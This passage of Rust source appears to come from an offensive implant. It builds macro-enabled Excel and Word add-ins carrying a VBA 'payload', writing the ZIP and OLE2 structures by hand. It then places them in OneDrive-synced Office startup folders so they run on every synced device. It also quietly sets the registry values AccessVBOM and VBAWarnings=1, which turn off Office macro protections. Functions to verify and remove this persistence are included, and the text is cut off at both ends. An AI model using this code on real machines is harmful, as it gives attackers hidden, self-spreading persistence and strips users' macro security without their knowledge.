            central_dir.extend_from_slice(&0u16.to_le_bytes()); // extra field length
            central_dir.extend_from_slice(&0u16.to_le_bytes()); // file comment length
            central_dir.extend_from_slice(&0u16.to_le_bytes()); // disk number start
            central_dir.extend_from_slice(&0u16.to_le_bytes()); // internal file attributes
            central_dir.extend_from_slice(&0u32.to_le_bytes()); // external file attributes
            central_dir.extend_from_slice(&offset.to_le_bytes()); // relative offset
            central_dir.extend_from_slice(name_bytes);

            offset = buf.len() as u32;
        }

        let cd_offset = buf.len() as u32;
        buf.extend_from_slice(&central_dir);
        let cd_size = central_dir.len() as u32;

        // ── End of central directory record ──
        buf.extend_from_slice(&0x06054b50u32.to_le_bytes()); // signature
        buf.extend_from_slice(&0u16.to_le_bytes()); // disk number
        buf.extend_from_slice(&0u16.to_le_bytes()); // disk with CD
        buf.extend_from_slice(&(self.entries.len() as u16).to_le_bytes()); // entries on disk
        buf.extend_from_slice(&(self.entries.len() as u16).to_le_bytes()); // total entries
        buf.extend_from_slice(&cd_size.to_le_bytes()); // CD size
        buf.extend_from_slice(&cd_offset.to_le_bytes()); // CD offset
        buf.extend_from_slice(&0u16.to_le_bytes()); // comment length

        buf
    }
}

/// CRC-32 checksum (ISO 3309 / ITU-T V.42).
fn crc32(data: &[u8]) -> u32 {
    // Lookup table.
    let mut table = [0u32; 256];
    for i in 0..256u32 {
        let mut crc = i;
        for _ in 0..8 {
            if crc & 1 != 0 {
                crc = (crc >> 1) ^ 0xEDB88320;
            } else {
                crc >>= 1;
            }
        }
        table[i as usize] = crc;
    }

    let mut crc: u32 = 0xFFFFFFFF;
    for &byte in data {
        crc = (crc >> 8) ^ table[((crc ^ byte as u32) & 0xFF) as usize];
    }
    !crc
}

// ═══════════════════════════════════════════════════════════════════════════
// Minimal OLE2/CFB compound file writer
// ═══════════════════════════════════════════════════════════════════════════
//
// Generates a minimal but valid OLE2 compound file (MS-CFB) containing
// the VBA project structure required for a macro-enabled Office add-in.
//
// Directory tree:
//   Root Entry
//   └─ VBA (storage)
//      ├─ _VBA_PROJECT (stream)
//      ├─ dir (stream – VBA project compressed directory)
//      └─ ThisWorkbook (stream – VBA module with payload)

/// A stream entry for the OLE2 compound file.
struct Ole2Stream {
    /// Entry name (UTF-16, max 32 chars including null).
    name: String,
    /// Whether this is a storage (directory) or stream (file).
    is_storage: bool,
    /// Stream data (empty for storage entries).
    data: Vec<u8>,
    /// Child index in the directory entry array (-1 if none).
    child: i32,
}

/// Minimal OLE2/CFB compound file builder.
///
/// Produces a valid .bin file with:
/// - 512-byte header (magic, sector size, FAT info)
/// - One FAT sector
/// - Directory entries (128 bytes each)
/// - Stream data sectors
/// - Mini-stream (for small streams < 4096 bytes)
/// - Mini-FAT
struct Ole2CompoundFile {
    streams: Vec<Ole2Stream>,
}

impl Ole2CompoundFile {
    fn new() -> Self {
        Self {
            streams: Vec::new(),
        }
    }

    /// Add a storage entry (directory).
    fn add_storage(&mut self, name: &str) {
        self.streams.push(Ole2Stream {
            name: name.to_string(),
            is_storage: true,
            data: Vec::new(),
            child: -1,
        });
    }

    /// Add a stream entry (file) with data.
    fn add_stream(&mut self, name: &str, data: &[u8]) {
        self.streams.push(Ole2Stream {
            name: name.to_string(),
            is_storage: false,
            data: data.to_vec(),
            child: -1,
        });
    }

    /// Render the OLE2 compound file to bytes.
    ///
    /// Layout:
    ///   Sector 0: Header (512 bytes)
    ///   Sector 1: FAT (128 entries × 4 bytes = 512 bytes)
    ///   Sector 2+: Directory entries + Mini-stream + Stream data
    fn render(&self) -> Vec<u8> {
        // ── Plan the layout ──
        //
        // We have these logical streams:
        //   0: Root Entry (always first)
        //   1: VBA (storage)
        //   2: _VBA_PROJECT
        //   3: dir
        //   4: ThisWorkbook (the VBA module)

        // Collect actual stream entries from what was added.
        // We'll create: Root Entry, VBA storage, then all added streams under VBA.
        let mut entries: Vec<DirEntry> = Vec::new();

        // Entry 0: Root Entry
        entries.push(DirEntry {
            name_utf16: encode_entry_name("Root Entry"),
            entry_type: DIR_ROOT,
            color: DIR_BLACK,
            child: 1, // points to VBA
            start_sector: 0, // will be updated
            stream_size: 0, // will be updated to mini-stream size
            left_sibling: -1,
            right_sibling: -1,
            data: Vec::new(),
        });

        // Entry 1: VBA storage
        entries.push(DirEntry {
            name_utf16: encode_entry_name("VBA"),
            entry_type: DIR_STORAGE,
            color: DIR_BLACK,
            child: 2, // points to first child (_VBA_PROJECT)
            start_sector: 0,
            stream_size: 0,
            left_sibling: -1,
            right_sibling: -1,
            data: Vec::new(),
        });

        // Entries 2+: Streams under VBA
        let mut child_idx = 2i32;
        for stream in &self.streams {
            let left = if child_idx > 2 { child_idx - 1 } else { -1 };
            entries.push(DirEntry {
                name_utf16: encode_entry_name(&stream.name),
                entry_type: if stream.is_storage {
                    DIR_STORAGE
                } else {
                    DIR_STREAM
                },
                color: DIR_BLACK,
                child: stream.child,
                start_sector: 0, // will be updated
                stream_size: if stream.is_storage { 0 } else { stream.data.len() as u32 },
                left_sibling: if child_idx > 2 { -1 } else { -1 },
                right_sibling: -1,
                data: if stream.is_storage { Vec::new() } else { stream.data.clone() },
            });
            child_idx += 1;
        }

        // Fix up VBA's child pointer.
        if entries.len() > 2 {
            entries[1].child = 2;
        }

        // Build the mini-stream: all small streams (< 4096 bytes) concatenated.
        let mut mini_stream_data = Vec::new();
        let mut mini_sector_offsets: Vec<u32> = Vec::new();

        for i in 2..entries.len() {
            if entries[i].entry_type == DIR_STREAM && entries[i].data.len() < 4096 {
                entries[i].start_sector = (mini_stream_data.len() / MINI_SECTOR_SIZE) as u32;
                mini_sector_offsets.push(entries[i].start_sector);
                // Pad to mini-sector boundary.
                let padded_len =
                    ((entries[i].data.len() + MINI_SECTOR_SIZE - 1) / MINI_SECTOR_SIZE)
                        * MINI_SECTOR_SIZE;
                mini_stream_data.extend_from_slice(&entries[i].data);
                mini_stream_data.resize(mini_stream_data.len() + padded_len - entries[i].data.len(), 0);
            }
        }

        // Update Root Entry's mini-stream info.
        if !mini_stream_data.is_empty() {
            entries[0].stream_size = mini_stream_data.len() as u32;
        }

        // ── Allocate sectors ──
        //
        // Sector 0: Header
        // Sector 1: FAT
        // Sector 2: Directory entries (1 sector = 4 entries)
        // Sector 3: Mini-stream data
        // Sector 4: Mini-FAT (if needed)
        // Sector 5+: Regular stream data (> 4096 bytes)

        let dir_sectors = ((entries.len() + DIR_ENTRIES_PER_SECTOR - 1) / DIR_ENTRIES_PER_SECTOR) as u32;
        let mini_stream_sectors =
            ((mini_stream_data.len() + SECTOR_SIZE - 1) / SECTOR_SIZE).max(1) as u32;
        let has_mini_fat = !mini_stream_data.is_empty();

        let fat_sector = 1u32;
        let dir_start_sector = 2u32;
        let mini_stream_start = dir_start_sector + dir_sectors;
        let mini_fat_start = mini_stream_start + mini_stream_sectors;
        let regular_data_start = if has_mini_fat {
            mini_fat_start + 1
        } else {
            mini_stream_start + mini_stream_sectors
        };

        let total_sectors = regular_data_start; // at minimum

        // Update directory entries' start sector.
        entries[0].start_sector = mini_stream_start;

        // ── Build FAT ──
        let mut fat = vec![FAT_FREE; 128];

        // Header (sector 0) is not in FAT.
        // FAT sector itself.
        fat[0] = FAT_FAT_SECTOR;

        // Directory sectors.
        for i in 0..dir_sectors {
            let idx = dir_start_sector + i - 1; // FAT indices are 0-based but sectors are 1-based for fat
            // Directory sectors start at sector 2 (FAT index 1 for dir_start_sector=2 → index 1)
            let fat_idx = (dir_start_sector + i) as usize - 1;
            if i + 1 < dir_sectors {
                fat[fat_idx] = (dir_start_sector + i + 1 - 1) as u32;
            } else {
                fat[fat_idx] = FAT_ENDOFCHAIN;
            }
        }

        // Mini-stream sectors.
        for i in 0..mini_stream_sectors {
            let fat_idx = (mini_stream_start + i) as usize - 1;
            if i + 1 < mini_stream_sectors {
                fat[fat_idx] = (mini_stream_start + i + 1 - 1) as u32;
            } else {
                fat[fat_idx] = FAT_ENDOFCHAIN;
            }
        }

        // Mini-FAT sector.
        if has_mini_fat {
            let fat_idx = mini_fat_start as usize - 1;
            fat[fat_idx] = FAT_ENDOFCHAIN;
        }

        // ── Build mini-FAT ──
        let mut mini_fat = Vec::new();
        if has_mini_fat {
            let num_mini_sectors = mini_stream_data.len() / MINI_SECTOR_SIZE;
            mini_fat = vec![FAT_ENDOFCHAIN; num_mini_sectors];
        }

        // ── Serialize ──
        let mut output = Vec::new();

        // Header (512 bytes).
        output.extend_from_slice(&OLE2_MAGIC); // signature (8 bytes)
        output.extend_from_slice(&[0u8; 4]); // CLSID (16 bytes, zeros)
        output.extend_from_slice(&[0u8; 4]);
        output.extend_from_slice(&[0u8; 4]);
        output.extend_from_slice(&[0u8; 4]);
        output.extend_from_slice(&3u16.to_le_bytes()); // minor version
        output.extend_from_slice(&0x00FFu16.to_le_bytes()); // major version (v3)
        output.extend_from_slice(&0xFFFEu16.to_le_bytes()); // byte order (little-endian)
        output.extend_from_slice(&9u16.to_le_bytes()); // sector size power (2^9 = 512)
        output.extend_from_slice(&6u16.to_le_bytes()); // mini sector size power (2^6 = 64)
        output.extend_from_slice(&[0u8; 6]); // reserved
        output.extend_from_slice(&0u32.to_le_bytes()); // total directory sectors (0 for v3)
        output.extend_from_slice(&total_sectors.to_le_bytes()); // total FAT sectors
        output.extend_from_slice(&dir_start_sector.to_le_bytes()); // first directory sector SID
        output.extend_from_slice(&0u32.to_le_bytes()); // transaction signature
        output.extend_from_slice(&4096u32.to_le_bytes()); // mini stream cutoff
        output.extend_from_slice(&mini_stream_start.to_le_bytes()); // first mini-stream sector SID
        output.extend_from_slice(&(mini_stream_data.len() as u32 / MINI_SECTOR_SIZE as u32).to_le_bytes()); // mini-stream size in sectors
        if has_mini_fat {
            output.extend_from_slice(&mini_fat_start.to_le_bytes()); // first mini-FAT sector
        } else {
            output.extend_from_slice(&FAT_ENDOFCHAIN.to_le_bytes()); // no mini-FAT
        }
        output.extend_from_slice(&1u32.to_le_bytes()); // total mini-FAT sectors
        output.extend_from_slice(&1u32.to_le_bytes()); // DIFAT first sector (FAT sector)
        output.extend_from_slice(&0u32.to_le_bytes()); // total DIFAT sectors
        // DIFAT array (109 entries).
        output.extend_from_slice(&fat_sector.to_le_bytes()); // DIFAT[0] = FAT sector
        for _ in 1..109 {
            output.extend_from_slice(&FAT_FREE.to_le_bytes());
        }

        // Pad header to 512 bytes.
        output.resize(SECTOR_SIZE, 0);

        // FAT sector.
        for &entry in &fat {
            output.extend_from_slice(&entry.to_le_bytes());
        }

        // Directory sectors.
        for entry in &entries {
            let mut dir_bytes = [0u8; 128];
            // Name (UTF-16, 64 bytes max).
            let name_bytes: Vec<u8> = entry.name_utf16.iter().flat_map(|c| c.to_le_bytes()).collect();
            let name_len = name_bytes.len().min(62);
            dir_bytes[..name_len].copy_from_slice(&name_bytes[..name_len]);
            dir_bytes[64] = (name_len + 2) as u8; // name size in bytes (including null)
            dir_bytes[66] = entry.entry_type;
            dir_bytes[67] = entry.color;
            dir_bytes[68..72].copy_from_slice(&entry.left_sibling.to_le_bytes());
            dir_bytes[72..76].copy_from_slice(&entry.right_sibling.to_le_bytes());
            dir_bytes[76..80].copy_from_slice(&entry.child.to_le_bytes());
            // CLSID (16 bytes, zeros) at offset 80.
            dir_bytes[96..100].copy_from_slice(&0u32.to_le_bytes()); // state bits
            dir_bytes[100..104].copy_from_slice(&0u64.to_le_bytes()); // creation time (low)
            dir_bytes[104..108].copy_from_slice(&0u64.to_le_bytes()); // creation time (high)
            dir_bytes[108..112].copy_from_slice(&0u64.to_le_bytes()); // modified time (low)
            dir_bytes[112..116].copy_from_slice(&0u64.to_le_bytes()); // modified time (high)
            dir_bytes[116..120].copy_from_slice(&entry.start_sector.to_le_bytes());
            dir_bytes[120..124].copy_from_slice(&entry.stream_size.to_le_bytes());
            // stream_size high DWORD (zero for v3).
            output.extend_from_slice(&dir_bytes);
        }
        // Pad directory sector to 512-byte boundary.
        let dir_written = entries.len() * 128;
        let dir_padded = ((dir_written + SECTOR_SIZE - 1) / SECTOR_SIZE) * SECTOR_SIZE;
        output.resize(output.len() + dir_padded - dir_written, 0);

        // Mini-stream sector(s).
        let mini_padded =
            ((mini_stream_data.len() + SECTOR_SIZE - 1) / SECTOR_SIZE) * SECTOR_SIZE;
        output.extend_from_slice(&mini_stream_data);
        output.resize(output.len() + mini_padded - mini_stream_data.len(), 0);

        // Mini-FAT sector (if needed).
        if has_mini_fat {
            for &entry in &mini_fat {
                output.extend_from_slice(&entry.to_le_bytes());
            }
            let mf_padded = ((mini_fat.len() * 4 + SECTOR_SIZE - 1) / SECTOR_SIZE) * SECTOR_SIZE;
            output.resize(output.len() + mf_padded - mini_fat.len() * 4, 0);
        }

        output
    }
}

/// Internal directory entry representation.
struct DirEntry {
    name_utf16: Vec<u16>,
    entry_type: u8,
    color: u8,
    child: i32,
    start_sector: u32,
    stream_size: u32,
    left_sibling: i32,
    right_sibling: i32,
    data: Vec<u8>,
}

/// Encode a string as UTF-16 with null terminator for directory entry name.
fn encode_entry_name(name: &str) -> Vec<u16> {
    let mut u16: Vec<u16> = name.encode_utf16().collect();
    u16.push(0); // null terminator
    u16.truncate(31); // max 31 chars + null = 32 u16 values = 64 bytes
    u16
}

// ═══════════════════════════════════════════════════════════════════════════
// VBA project OLE2 builder
// ═══════════════════════════════════════════════════════════════════════════

/// Build the vbaProject.bin OLE2 compound file containing the VBA macro.
fn build_vba_project_bin(vba_code: &str) -> Vec<u8> {
    let vba_bytes = vba_code.as_bytes();

    // _VBA_PROJECT stream: minimal header.
    // This is a simple binary blob that Office expects.
    let vba_project_header = build_vba_project_header();

    // dir stream: compressed VBA project directory.
    // This tells Office where to find the VBA modules.
    let dir_stream = build_dir_stream();

    // ThisWorkbook module stream: the actual VBA code.
    let mut module_stream = Vec::new();
    // Module performance cache header (minimal).
    module_stream.extend_from_slice(&0x0000CCCCu32.to_le_bytes()); // magic
    module_stream.extend_from_slice(&0x0000u16.to_le_bytes()); // offset
    module_stream.extend_from_slice(&(vba_bytes.len() as u32).to_le_bytes()); // size
    module_stream.extend_from_slice(vba_bytes);
    // Align to 4096.
    let padded = ((module_stream.len() + 4095) / 4096) * 4096;
    module_stream.resize(padded, 0);

    // Build OLE2 compound file.
    let mut ole2 = Ole2CompoundFile::new();
    ole2.add_stream("_VBA_PROJECT", &vba_project_header);
    ole2.add_stream("dir", &dir_stream);
    ole2.add_stream("ThisWorkbook", &module_stream);

    ole2.render()
}

/// Build the _VBA_PROJECT stream header.
fn build_vba_project_header() -> Vec<u8> {
    let mut buf = Vec::new();
    // _VBA_PROJECT header format:
    //   4 bytes: signature (0xCC61)
    //   4 bytes: version (0xFFFF for VBA6)
    //   4 bytes: reserved
    //   4 bytes: performance cache offset
    buf.extend_from_slice(&0x000061CCu32.to_le_bytes()); // signature
    buf.extend_from_slice(&0x0000FFFFu32.to_le_bytes()); // version
    buf.extend_from_slice(&0x00000000u32.to_le_bytes()); // reserved
    buf.extend_from_slice(&0x00000000u32.to_le_bytes()); // performance cache
    buf
}

/// Build the minimal VBA dir stream (project directory).
///
/// This is a simplified version — a real dir stream is compressed with
/// MS-ZIP (RtlCompressBuffer).  For our purposes, we generate a minimal
/// uncompressed structure that Office can parse.
fn build_dir_stream() -> Vec<u8> {
    let mut buf = Vec::new();

    // PROJECTINFORMATION record.
    // SysKind (0x0001)
    buf.extend_from_slice(&0x0001u16.to_le_bytes()); // id
    buf.extend_from_slice(&0x0004u32.to_le_bytes()); // size
    buf.extend_from_slice(&0x00000001u32.to_le_bytes()); // 32-bit Windows

    // CompatVersion (0x004A)
    buf.extend_from_slice(&0x004Au16.to_le_bytes());
    buf.extend_from_slice(&0x0004u32.to_le_bytes());
    buf.extend_from_slice(&0x00000003u32.to_le_bytes()); // VBA6

    // LcId (0x0002)
    buf.extend_from_slice(&0x0002u16.to_le_bytes());
    buf.extend_from_slice(&0x0004u32.to_le_bytes());
    buf.extend_from_slice(&0x0409u32.to_le_bytes()); // en-US

    // LcIdInvoke (0x0014)
    buf.extend_from_slice(&0x0014u16.to_le_bytes());
    buf.extend_from_slice(&0x0004u32.to_le_bytes());
    buf.extend_from_slice(&0x0409u32.to_le_bytes());

    // ProjectName (0x0004) — "ThisWorkbook"
    let project_name = b"ThisWorkbook";
    buf.extend_from_slice(&0x0004u16.to_le_bytes());
    buf.extend_from_slice(&(project_name.len() as u32).to_le_bytes());
    buf.extend_from_slice(project_name);

    // ProjectDocString (0x0005)
    buf.extend_from_slice(&0x0005u16.to_le_bytes());
    buf.extend_from_slice(&0x00000000u32.to_le_bytes()); // empty

    // ProjectDocStringUnicode (0x0040)
    buf.extend_from_slice(&0x0040u16.to_le_bytes());
    buf.extend_from_slice(&0x00000000u32.to_le_bytes()); // empty

    // ProjectHelpFilePath (0x0006)
    buf.extend_from_slice(&0x0006u16.to_le_bytes());
    buf.extend_from_slice(&0x00000000u32.to_le_bytes());

    // ProjectHelpFilePath2 (0x003D)
    buf.extend_from_slice(&0x003Du16.to_le_bytes());
    buf.extend_from_slice(&0x00000000u32.to_le_bytes());

    // ProjectHelpContext (0x0007)
    buf.extend_from_slice(&0x0007u16.to_le_bytes());
    buf.extend_from_slice(&0x0004u32.to_le_bytes());
    buf.extend_from_slice(&0x00000000u32.to_le_bytes());

    // ProjectLibFlags (0x0008)
    buf.extend_from_slice(&0x0008u16.to_le_bytes());
    buf.extend_from_slice(&0x0004u32.to_le_bytes());
    buf.extend_from_slice(&0x00000000u32.to_le_bytes());

    // ProjectVersion (0x0009)
    buf.extend_from_slice(&0x0009u16.to_le_bytes());
    buf.extend_from_slice(&0x0004u32.to_le_bytes());
    buf.extend_from_slice(&0x00006E3Du32.to_le_bytes()); // version major

    // ProjectConstants (0x000C)
    buf.extend_from_slice(&0x000Cu16.to_le_bytes());
    buf.extend_from_slice(&0x00000000u32.to_le_bytes());

    // PROJECTREFERENCES — none needed for minimal project.

    // MODULES record.
    // ModulesCount (0x000F)
    buf.extend_from_slice(&0x000Fu16.to_le_bytes());
    buf.extend_from_slice(&0x0002u32.to_le_bytes());
    buf.extend_from_slice(&0x0001u16.to_le_bytes()); // 1 module

    // Module (0x0019) — ThisWorkbook
    let module_name = b"ThisWorkbook";
    buf.extend_from_slice(&0x0019u16.to_le_bytes());
    buf.extend_from_slice(&(module_name.len() as u32).to_le_bytes());
    buf.extend_from_slice(module_name);

    // ModuleNameUnicode (0x0047)
    let module_name_u16: Vec<u16> = "ThisWorkbook".encode_utf16().collect();
    let module_name_bytes: Vec<u8> = module_name_u16
        .iter()
        .flat_map(|c| c.to_le_bytes())
        .collect();
    buf.extend_from_slice(&0x0047u16.to_le_bytes());
    buf.extend_from_slice(&(module_name_bytes.len() as u32).to_le_bytes());
    buf.extend_from_slice(&module_name_bytes);

    // ModuleStreamName (0x001A)
    buf.extend_from_slice(&0x001Au16.to_le_bytes());
    buf.extend_from_slice(&(module_name.len() as u32).to_le_bytes());
    buf.extend_from_slice(module_name);

    // ModuleStreamNameUnicode (0x0032)
    buf.extend_from_slice(&0x0032u16.to_le_bytes());
    buf.extend_from_slice(&(module_name_bytes.len() as u32).to_le_bytes());
    buf.extend_from_slice(&module_name_bytes);

    // ModuleOffset (0x0031)
    buf.extend_from_slice(&0x0031u16.to_le_bytes());
    buf.extend_from_slice(&0x0004u32.to_le_bytes());
    buf.extend_from_slice(&0x000Cu32.to_le_bytes()); // offset into ThisWorkbook stream

    // ModuleType (0x0021) — procedural
    buf.extend_from_slice(&0x0021u16.to_le_bytes());
    buf.extend_from_slice(&0x00000000u32.to_le_bytes());

    // ModuleTerminator (0x002B)
    buf.extend_from_slice(&0x002Bu16.to_le_bytes());
    buf.extend_from_slice(&0x0000u32.to_le_bytes());

    // PROJECTEND (0x0010)
    buf.extend_from_slice(&0x0010u16.to_le_bytes());
    buf.extend_from_slice(&0x00000000u32.to_le_bytes());

    buf
}

// ═══════════════════════════════════════════════════════════════════════════
// Add-in generator
// ═══════════════════════════════════════════════════════════════════════════

/// Generate a macro-enabled Excel add-in (.xlam) file.
pub fn generate_xlam(payload_path: &Path) -> Vec<u8> {
    generate_addin(payload_path, AddinType::Excel)
}

/// Generate a macro-enabled Word template (.dotm) file.
pub fn generate_dotm(payload_path: &Path) -> Vec<u8> {
    generate_addin(payload_path, AddinType::Word)
}

/// Generate an Office add-in file (ZIP + OLE2).
fn generate_addin(payload_path: &Path, addin_type: AddinType) -> Vec<u8> {
    let vba_code = generate_vba_payload(payload_path);
    let vba_project_bin = build_vba_project_bin(&vba_code);

    let mut zip = ZipWriter::new();

    match addin_type {
        AddinType::Excel => {
            zip.add_file("[Content_Types].xml", CONTENT_TYPES_XML.as_bytes());
            zip.add_file("_rels/.rels", RELS_XML.as_bytes());
            zip.add_file("xl/workbook.xml", WORKBOOK_XML.as_bytes());
            zip.add_file("xl/_rels/workbook.xml.rels", WORKBOOK_RELS_XML.as_bytes());
            zip.add_file("xl/vbaProject.bin", &vba_project_bin);
        }
        AddinType::Word => {
            zip.add_file("[Content_Types].xml", CONTENT_TYPES_XML_WORD.as_bytes());
            zip.add_file("_rels/.rels", RELS_XML_WORD.as_bytes());
            zip.add_file("word/document.xml", DOCUMENT_XML.as_bytes());
            zip.add_file("word/_rels/document.xml.rels", WORKBOOK_RELS_XML.as_bytes());
            zip.add_file("word/vbaProject.bin", &vba_project_bin);
        }
    }

    zip.render()
}

// ═══════════════════════════════════════════════════════════════════════════
// Registry helpers
// ═══════════════════════════════════════════════════════════════════════════

/// Enable the "Trust access to the VBA project object model" setting.
///
/// Sets `HKCU\Software\Microsoft\Office\16.0\Common\Security\AccessVBOM = 1`.
fn enable_access_vbom(api: &Api) -> Result<bool> {
    unsafe {
        let hkcu: HANDLE = 0x80000001 as *mut _;
        let mut h_key: HANDLE = ptr::null_mut();
        let mut disposition: u32 = 0;

        // Create or open the key.
        let trust_path = wide(r"Software\Microsoft\Office\16.0\Common\Security");
        let result = (api.reg_create_key_ex_w)(
            hkcu,
            trust_path.as_ptr(),
            0,
            ptr::null_mut(),
            0,
            0x0002 | 0x0004, // KEY_SET_VALUE | KEY_CREATE_SUB_KEY
            ptr::null_mut(),
            &mut h_key,
            &mut disposition,
        );
        if result != 0 {
            bail!("RegCreateKeyExW for Trust Center failed: {}", result);
        }

        // Set AccessVBOM = 1.
        let value_name: Vec<u16> =
            OsStr::new("AccessVBOM").encode_wide().chain(std::iter::once(0)).collect();
        let data: u32 = 1;
        let result = (api.reg_set_value_ex_w)(
            h_key,
            value_name.as_ptr(),
            0,
            4, // REG_DWORD
            &data as *const u32 as *const u8,
            4,
        );
        let _ = (api.reg_close_key)(h_key);

        if result != 0 {
            bail!("RegSetValueExW for AccessVBOM failed: {}", result);
        }

        let was_created = disposition == 1;
        Ok(was_created)
    }
}

/// Set VBAWarnings to 1 (enable all macros) for the target Office app.
fn enable_macro_warnings(api: &Api, addin_type: AddinType) -> Result<bool> {
    unsafe {
        let hkcu: HANDLE = 0x80000001 as *mut _;

        let reg_path = match addin_type {
            AddinType::Excel => r"Software\Microsoft\Office\16.0\Excel\Security",
            AddinType::Word => r"Software\Microsoft\Office\16.0\Word\Security",
        };

        let mut h_key: HANDLE = ptr::null_mut();
        let mut disposition: u32 = 0;

        let reg_path_wide = wide(reg_path);
        let result = (api.reg_create_key_ex_w)(
            hkcu,
            reg_path_wide.as_ptr(),
            0,
            ptr::null_mut(),
            0,
            0x0002 | 0x0004,
            ptr::null_mut(),
            &mut h_key,
            &mut disposition,
        );
        if result != 0 {
            bail!("RegCreateKeyExW for macro security failed: {}", result);
        }

        let value_name: Vec<u16> =
            OsStr::new("VBAWarnings").encode_wide().chain(std::iter::once(0)).collect();
        let data: u32 = 1; // Enable all macros
        let result = (api.reg_set_value_ex_w)(
            h_key,
            value_name.as_ptr(),
            0,
            4, // REG_DWORD
            &data as *const u32 as *const u8,
            4,
        );
        let _ = (api.reg_close_key)(h_key);

        if result != 0 {
            bail!("RegSetValueExW for VBAWarnings failed: {}", result);
        }

        Ok(disposition == 1)
    }
}

/// Check if AccessVBOM is currently enabled.
fn check_access_vbom(api: &Api) -> bool {
    unsafe {
        let hkcu: HANDLE = 0x80000001 as *mut _;
        let mut h_key: HANDLE = ptr::null_mut();

        let subkey: Vec<u16> = OsStr::new(r"Software\Microsoft\Office\16.0\Common\Security")
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();

        let result =
            (api.reg_open_key_ex_w)(hkcu, subkey.as_ptr(), 0, 0x0001, &mut h_key);
        if result != 0 {
            return false;
        }

        let value_name: Vec<u16> =
            OsStr::new("AccessVBOM").encode_wide().chain(std::iter::once(0)).collect();
        let mut data: u32 = 0;
        let mut data_len = 4u32;
        let mut reg_type: u32 = 0;

        let qr = (api.reg_query_value_ex_w)(
            h_key,
            value_name.as_ptr(),
            ptr::null_mut(),
            &mut reg_type,
            &mut data as *mut u32 as *mut u8,
            &mut data_len,
        );
        let _ = (api.reg_close_key)(h_key);

        qr == 0 && reg_type == 4 && data == 1
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Public API: install / verify / remove
// ═══════════════════════════════════════════════════════════════════════════

/// Install Office add-in persistence via OneDrive sync.
///
/// 1. Discovers OneDrive paths (registry → env → filesystem probe)
/// 2. Creates the target directory (XLSTART or STARTUP) if needed
/// 3. Generates the macro-enabled add-in (.xlam / .dotm)
/// 4. Writes the add-in to the OneDrive-synced directory
/// 5. Enables AccessVBOM and lowers macro security warnings
///
/// Returns metadata about the installation.
pub fn install_office_addin(config: &OfficeAddinConfig) -> Result<AddinInstallResult> {
    let api = Api::resolve()?;

    // 1. Discover OneDrive paths.
    let onedrive = if let Some(ref root) = config.onedrive_path {
        OneDrivePaths {
            root: root.clone(),
            xlstart: root.join("Documents").join(XLSTART_DIR),
            word_startup: root.join("Documents").join(WORD_STARTUP_DIR),
        }
    } else {
        discover_onedrive_paths(&api)?
    };

    info!(
        "OneDrive root: {:?}, add-in type: {:?}",
        onedrive.root, config.addin_type
    );

    // 2. Determine target directory and filename.
    let target_dir = match config.addin_type {
        AddinType::Excel => &onedrive.xlstart,
        AddinType::Word => &onedrive.word_startup,
    };

    let extension = match config.addin_type {
        AddinType::Excel => "xlam",
        AddinType::Word => "dotm",
    };

    let filename = config
        .addin_filename
        .clone()
        .unwrap_or_else(|| format!("{}.{}", random_alphanum(DISC_FILENAME), extension));

    let addin_path = target_dir.join(&filename);

    // 3. Create target directory.
    std::fs::create_dir_all(target_dir).with_context(|| {
        format!("failed to create directory: {}", target_dir.display())
    })?;

    // 4. Generate the add-in.
    let addin_data = match config.addin_type {
        AddinType::Excel => generate_xlam(&config.payload_path),
        AddinType::Word => generate_dotm(&config.payload_path),
    };

    debug!("Generated {} add-in: {} bytes", extension, addin_data.len());

    // 5. Write the add-in file.
    std::fs::write(&addin_path, &addin_data).with_context(|| {
        format!("failed to write add-in: {}", addin_path.display())
    })?;

    info!("Wrote add-in to {}", addin_path.display());

    // 6. Enable AccessVBOM and lower macro security.
    let access_vbom_set = match enable_access_vbom(&api) {
        Ok(created) => {
            info!("AccessVBOM enabled (key {})", if created { "created" } else { "updated" });
            true
        }
        Err(e) => {
            warn!("Failed to enable AccessVBOM: {}", e);
            false
        }
    };

    let macro_warnings_set = match enable_macro_warnings(&api, config.addin_type) {
        Ok(created) => {
            info!("VBAWarnings set to 1 (key {})", if created { "created" } else { "updated" });
            true
        }
        Err(e) => {
            warn!("Failed to set VBAWarnings: {}", e);
            false
        }
    };

    Ok(AddinInstallResult {
        addin_path,
        access_vbom_set,
        macro_warnings_set,
        addin_type: config.addin_type,
    })
}

/// Verify that Office add-in persistence is still in place.
///
/// Checks:
/// 1. Add-in file exists at the expected path
/// 2. AccessVBOM is enabled (optional, but warns if not)
/// 3. File is non-empty and has a valid ZIP signature
pub fn verify_addin_persistence(config: &OfficeAddinConfig) -> Result<bool> {
    let api = Api::resolve()?;

    let onedrive = if let Some(ref root) = config.onedrive_path {
        OneDrivePaths {
            root: root.clone(),
            xlstart: root.join("Documents").join(XLSTART_DIR),
            word_startup: root.join("Documents").join(WORD_STARTUP_DIR),
        }
    } else {
        discover_onedrive_paths(&api)?
    };

    let target_dir = match config.addin_type {
        AddinType::Excel => &onedrive.xlstart,
        AddinType::Word => &onedrive.word_startup,
    };

    let extension = match config.addin_type {
        AddinType::Excel => "xlam",
        AddinType::Word => "dotm",
    };

    let filename = config
        .addin_filename
        .clone()
        .unwrap_or_else(|| format!("{}.{}", random_alphanum(DISC_FILENAME), extension));

    let addin_path = target_dir.join(&filename);

    // Check file exists.
    if !addin_path.exists() {
        debug!("Add-in file not found: {}", addin_path.display());
        return Ok(false);
    }

    // Check file has valid ZIP signature (PK\x03\x04).
    let data = std::fs::read(&addin_path).with_context(|| {
        format!("failed to read add-in: {}", addin_path.display())
    })?;

    if data.len() < 4 || &data[0..4] != &[0x50, 0x4B, 0x03, 0x04] {
        warn!("Add-in file has invalid ZIP signature: {}", addin_path.display());
        return Ok(false);
    }

    // Check AccessVBOM.
    if !check_access_vbom(&api) {
        warn!("AccessVBOM is not enabled — macros may be blocked");
    }

    info!("Add-in persistence verified: {}", addin_path.display());
    Ok(true)
}

/// Remove Office add-in persistence.
///
/// Deletes the add-in file from the OneDrive-synced directory.  Because the
/// file is inside OneDrive, the deletion will sync to all devices.
///
/// Optionally restores AccessVBOM and VBAWarnings if they were set.
pub fn remove_office_addin(config: &OfficeAddinConfig) -> Result<()> {
    let api = Api::resolve()?;

    let onedrive = if let Some(ref root) = config.onedrive_path {
        OneDrivePaths {
            root: root.clone(),
            xlstart: root.join("Documents").join(XLSTART_DIR),
            word_startup: root.join("Documents").join(WORD_STARTUP_DIR),
        }
    } else {
        match discover_onedrive_paths(&api) {
